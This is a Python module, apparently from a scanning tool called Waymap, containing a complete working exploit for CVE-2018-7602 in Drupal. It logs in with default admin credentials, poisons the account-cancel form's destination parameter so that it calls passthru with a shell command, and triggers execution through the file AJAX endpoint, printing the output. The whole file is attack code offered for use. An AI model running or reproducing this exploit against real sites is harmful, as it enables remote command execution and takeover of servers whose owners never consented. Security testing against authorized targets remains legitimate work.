# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2018-7602

import requests
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Color:
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]

def exploit_target(profile_url):
    username = "admin"  
    password = "admin"  
    command = "id"     
    function = "passthru"  
    proxy = ""          

    requests.packages.urllib3.disable_warnings()
    session = requests.Session()
    proxyConf = {'http': proxy, 'https': proxy}

    try:
        print(Color.OKGREEN + '[*] Initiating session with the provided credentials...' + Color.END)
        get_params = {'q': 'user/login'}
        post_params = {'form_id': 'user_login', 'name': username, 'pass': password, 'op': 'Log in'}
        
        print(Color.OKGREEN + '[*] Attempting to log in and fetch the user ID...' + Color.END)
        login_response = session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
        
        if login_response.status_code != 200 or 'logout' not in login_response.text:
            print(Color.RED + "[-] Login failed. Exiting." + Color.END)
            return 
        
        get_params = {'q': 'user'}
        r = session.get(profile_url, params=get_params, verify=False, proxies=proxyConf)
        
        soup = BeautifulSoup(r.text, "html.parser")
        user_id_tag = soup.find('meta', {'property': 'foaf:name'})
        if not user_id_tag:
            print(Color.RED + "[-] Failed to retrieve User ID. Exiting." + Color.END)
            return  

        user_id = user_id_tag.get('about')
        if "?q=" in user_id:
            user_id = user_id.split("=")[1]

        if user_id:
            print(Color.OKGREEN + '[+] Successfully retrieved User ID: ' + user_id + Color.END)
        else:
            print(Color.RED + "[-] User ID extraction failed. Exiting." + Color.END)
            return  

        print(Color.OKGREEN + '[*] Poisoning the form using the `destination` variable and caching it...' + Color.END)
        get_params = {'q': user_id + '/cancel'}
        r = session.get(profile_url, params=get_params, verify=False, proxies=proxyConf)
        soup = BeautifulSoup(r.text, "html.parser")
        
        form = soup.find('form', {'id': 'user-cancel-confirm-form'})
        if not form:
            print(Color.RED + "[-] Failed to find cancel form. Exiting." + Color.END)
            return 

        form_token = form.find('input', {'name': 'form_token'}).get('value')
        if not form_token:
            print(Color.RED + "[-] Failed to retrieve form token. Exiting." + Color.END)
            return 

        get_params = {
            'q': user_id + '/cancel',
            'destination': user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command
        }
        post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': form_token, '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
        r = session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
        
        soup = BeautifulSoup(r.text, "html.parser")
        form_build_id = soup.find('input', {'name': 'form_build_id'}).get('value')

        if form_build_id:
            print(Color.OKGREEN + '[+] Poisoned form with ID: ' + form_build_id + Color.END)
            print(Color.OKGREEN + '[*] Triggering the exploit to execute the command: ' + command + Color.END)
            
            get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id}
            post_params = {'form_build_id': form_build_id}
            r = session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
            
            parsed_result = r.text.split('[{"command":"settings"')[0]
            print(parsed_result)
        else:
            print(Color.RED + "[-] Failed to retrieve form build ID. Exiting." + Color.END)
            return  

    except Exception as e:
        print(Color.RED + "[!] ERROR: Something went wrong during the exploit." + Color.END)
        print("Error details: %s" % str(e))
        return  

def scan_cve_2018_7602(profile_url):
    exploit_target(profile_url)
